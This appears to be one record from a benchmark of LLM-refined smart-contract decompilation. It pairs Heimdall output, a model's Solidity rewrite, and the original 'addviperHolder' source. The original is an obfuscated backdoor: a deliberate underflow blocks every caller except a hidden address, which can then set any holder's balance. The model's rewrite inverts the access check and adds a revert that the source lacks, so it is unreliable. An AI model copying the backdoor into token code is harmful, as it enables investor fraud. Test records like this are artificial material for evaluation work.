{
    "contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "pragma solidity ^0.8.0;\n\ncontract DecompiledViper {\n    // Storage presumed from decompiled output\n    mapping(address => uint256) private viperBalances;\n    address private privilegedAddress; // corresponds to `store_f` in decompiled code\n\n    /*\n     * addViperHolder \u2013 refined from decompiled code\n     *\n     * NOTE: The original byte-code contains a check that always fails\n     * (require(false)).  Per instructions, it has been translated to an\n     * unconditional revert while preserving the preceding state-changes.\n     */\n    function addViperHolder(address holder, uint256 amount) external payable {\n        // 1. Redundant self-equality check\n        require(holder == address(holder), \"Redundant self-check failed\");\n\n        // 2. Sender must NOT be the privileged address\n        //    (mirrors  `!msg.sender == address(store_f)`  from decompiler)\n        require(msg.sender != privilegedAddress, \"Sender is privileged\");\n\n        // 3. First state-change happens before the guaranteed revert\n        viperBalances[holder] = amount;\n\n        // 4. Decompiler artifact \u2013 this always reverts in the original byte-code\n        revert(\"Decompiler artifact\");\n\n        // --------------------------------------------------------------------\n        // The statements below are unreachable in practice, but are kept here\n        // to remain byte-code faithful to the decompiled control-flow.\n        // --------------------------------------------------------------------\n        require(!(10 < 10), \"Unreachable check passed\"); // always true\n        viperBalances[holder] = amount;\n    }\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}